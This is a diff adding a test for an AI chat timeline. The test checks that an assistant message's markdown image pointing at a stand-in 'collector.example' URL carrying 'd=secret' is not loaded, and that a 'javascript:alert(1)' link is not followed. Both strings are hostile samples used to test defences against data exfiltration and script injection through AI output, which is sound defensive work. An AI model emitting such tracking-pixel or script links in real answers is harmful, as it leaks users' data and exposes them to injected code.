@@ -120,6 +120,37 @@ describe("AiMessageTimeline", () => {
     expect(view.onRetryMessage).toHaveBeenCalledWith(1);
   });
 
+  test("never loads remote images or navigates away from AI answers", () => {
+    const open = mock((..._args: unknown[]) => null);
+    const originalOpen = window.open;
+    window.open = open as unknown as typeof window.open;
+    try {
+      const view = renderTimeline([
+        {
+          content:
+            "![状态](https://collector.example/pixel?d=secret)\n\n[文档](https://docs.example/guide) 和 [脚本](javascript:alert(1))",
+          id: "assistant-1",
+          role: "assistant",
+        },
+      ]);
+
+      expect(view.container.querySelector("img")).toBeNull();
+      expect(screen.getByText("[图片未加载：状态]")).not.toBeNull();
+
+      const link = screen.getByText("文档");
+      // fireEvent returns false when the default navigation was prevented.
+      expect(fireEvent.click(link)).toBe(false);
+      expect(open).toHaveBeenCalledTimes(1);
+      expect(open.mock.calls[0]?.[0]).toBe("https://docs.example/guide");
+
+      const scriptLink = screen.queryByText("脚本");
+      if (scriptLink) fireEvent.click(scriptLink);
+      expect(open).toHaveBeenCalledTimes(1);
+    } finally {
+      window.open = originalOpen;
+    }
+  });
+
   test("keeps unregistered markdown commands copy-only", () => {
     renderTimeline([
       {
